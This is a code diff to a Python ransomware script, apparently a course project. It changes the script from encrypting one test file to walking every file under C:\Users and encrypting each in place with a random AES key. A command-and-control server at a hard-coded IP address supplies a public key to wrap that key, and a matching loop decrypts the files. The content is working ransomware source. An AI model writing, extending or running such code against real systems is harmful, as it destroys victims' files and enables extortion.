@@ -42,12 +42,15 @@ def decrypt_file(file_path, out_file_path, key):
         outfile.write(decrypted)
 
 # Batch Functions
+file_paths = []
 
-def encrypt_system(key):
-    pass
-
-def decrypt_system(key):
-    pass
+def load_file_paths():
+    for root, dirs, files in os.walk("C:\Users"):
+        for name in dirs + files:
+            path = os.path.join(root, name)
+            global file_paths
+            if "CECS378" not in path.lower():
+                file_paths.append(os.path.join(root, name))
 
 # C2 Server Connection
 url = 'http://34.66.45.94:3000/'
@@ -86,7 +89,9 @@ else:
     key = get_random_bytes(32)
 
     # Start Encrypting Computer
-    encrypt_file("./test_encrypt.txt", "./test_encrypt.txt", key) 
+    load_file_paths()
+    for path in file_paths:
+        encrypt_file(path, path, key)
 
     # Encrypt AES Key And Store In File
     # Get Public Key From C2 Server
@@ -149,4 +154,6 @@ decrypted_aes = priv_key.decrypt(
             )
         )
 
-decrypt_file("./test_encrypt.txt", "./test_encrypt.txt", decrypted_aes)
+load_file_paths()
+for dec_path in file_paths:
+    decrypt_file(dec_path, dec_path, decrypted_aes)
